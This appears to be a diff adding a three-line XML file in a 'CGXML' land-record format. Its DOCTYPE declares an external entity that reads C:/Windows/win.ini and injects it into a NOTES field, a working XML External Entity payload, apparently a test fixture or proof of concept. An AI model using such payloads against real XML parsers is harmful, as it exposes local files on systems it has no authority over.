@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE CGXML [<!ENTITY leak SYSTEM "file:///C:/Windows/win.ini">]>
+<CGXML><Land><LANDID>1</LANDID><NOTES>&leak;</NOTES></Land></CGXML>
